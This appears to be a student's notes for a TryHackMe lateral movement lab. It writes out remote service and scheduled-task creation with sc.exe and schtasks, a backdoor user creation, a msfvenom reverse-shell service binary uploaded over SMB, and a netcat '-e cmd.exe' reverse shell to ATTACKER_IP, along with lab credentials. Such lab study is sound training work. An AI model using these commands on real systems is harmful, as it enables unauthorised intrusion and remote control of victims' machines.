# Lateral Movement and Pivoting
## Setup for tryhackme lab

<pre>
sudo nano /etc/resolv.conf
</pre>

edit it to:
<pre>
nameserver 'IP'
nameserver 8.8.8.8
</pre>

restart networking service
`sudo systemctl restart networking.service`

## Spawning Processes Remotely
This task will look at the available methods an attacker has to spawn a process remotely, allowing them to run commands on machines where they have valid credentials. Each of the techniques discussed uses slightly different ways to achieve the same purpose, and some of them might be a better fit for some specific scenarios.

### sc.exe

How to start service 
<pre>
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
</pre>
The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

How to stop and delete service
<pre>
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
</pre>

### Creating Scheduled Tasks Remotely

<pre>
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "command/payload to execute" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 

</pre>

Deletion
<pre>schtasks /S TARGET /TN "THMtask1" /DELETE /F</pre>

### Let's go
We will ssh as user

Assume we have the administrator creds

<pre>User: ZA.TRYHACKME.COM\t1_leonard.summers

Password: EZpass4ever</pre>

Create rev shell 

<pre>
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe

smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
</pre>

Setup listener
<pre>
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
</pre>

Setup another listener for nc

<pre>
nc -lvp 4443
</pre>

#### Victims machine

Do the reverse shell using t1_leonard.summer's access token
<pre>
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
</pre>

And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary
<pre>
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto

sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
</pre>